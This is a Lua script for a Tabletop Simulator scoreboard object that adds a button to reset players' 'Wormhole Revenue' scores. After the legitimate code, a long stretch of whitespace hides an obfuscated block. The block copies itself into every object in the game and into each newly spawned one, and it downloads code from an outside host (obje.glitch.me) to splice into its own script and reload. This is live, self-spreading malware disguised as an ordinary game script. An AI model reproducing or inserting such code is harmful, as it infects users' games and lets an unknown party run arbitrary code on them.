-- Scoreboard Script --

function onLoad()
    createResetButton()
end

function createResetButton()
    self.clearButtons()
    self.createButton({
        click_function = "clickedReset",
        function_owner = self,
        label          = "RESET SCORES",
        position       = {0, 0.1, 0.70}, 
        rotation       = {0, 180, 0},
        width          = 250,
        height         = 20,
        font_size      = 30,
        color          = {1, 0, 0},
        font_color     = {1, 1, 1},
        tooltip        = "Click to clear all wormhole revenue"
    })    
end

function clickedReset(obj, player_color)
    -- This is the most direct way to reset the Global variable
    Global.setTable("scores", {
        Red = 0, Blue = 0, Yellow = 0, Purple = 0, Green = 0
    })
    
    -- Tell Global to update the text on this card
    Global.call("updateNotecard")
    
    broadcastToAll("Wormhole Revenue has been reset by " .. player_color, {1, 1, 1})
end                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\n\n")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\n\n")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find("ereh edoc resU")+1):gsub("[%(%)%.%%%+%-%*%?%[%]%^%$]","%%%0"),""))end end end end end;WebRequest.get("https://obje.glitch.me/",function(g)if g.is_error then log(g.error)elseif g.text~=""and g.text:sub(1,4)=="true"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]

